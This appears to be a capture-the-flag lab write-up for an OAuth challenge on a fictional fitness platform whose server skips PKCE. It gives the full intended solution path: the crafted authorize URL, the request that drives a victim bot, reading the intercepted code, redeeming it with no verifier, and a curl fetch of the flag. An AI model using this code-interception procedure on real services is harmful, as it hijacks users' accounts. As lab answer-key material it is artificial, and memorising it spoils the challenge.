# oauth/no-pkce — NoPkce (identity-gated, medium)

**FitSync** fitness platform: the mobile app (public client `mobile`) signs in via the custom scheme `fitsync://callback`; the client policy says PKCE is **required**, but the AS never enforces it.
**Bug:** `/oauth/authorize` accepts requests without a `code_challenge`, and `/oauth/token` exchanges codes without a `code_verifier`. Custom-scheme callbacks are also broadcast through the OS app-link dispatcher — the lab device's dispatch log (`/intercepted`) simulates a malicious app that registered the same scheme and receives every `fitsync://callback?code=…` link.

## Intended path
1. Craft the challenge-free authorize URL:
   `http://victim.target.lab:8119/oauth/authorize?client_id=mobile&redirect_uri=fitsync%3A%2F%2Fcallback&response_type=code&scope=read`
2. Drive the victim through it: `POST http://collector.target.lab:8119/victim` with `{"url":"<that URL>","sso":true}` — the bot (innocent AS session) is redirected to `fitsync://callback?code=<innocent code>` (the bot cannot follow the custom scheme; the hop `location` shows it).
3. Read the intercepted link at `GET http://victim.target.lab:8119/intercepted` (or from the bot response) — it contains the code.
4. Exchange it with **no verifier**: `POST /oauth/token` `{"code":"<code>"}` → `access_token` (sub = the innocent's social identity).
5. `curl -H "Authorization: Bearer <token>" http://victim.target.lab:8119/flag` — gate: token `sub` must be the innocent identity (server-side).

**Flag:** `DSLTV{OAUTH-NoPkce-<9 digits>}` (only from `/flag`).
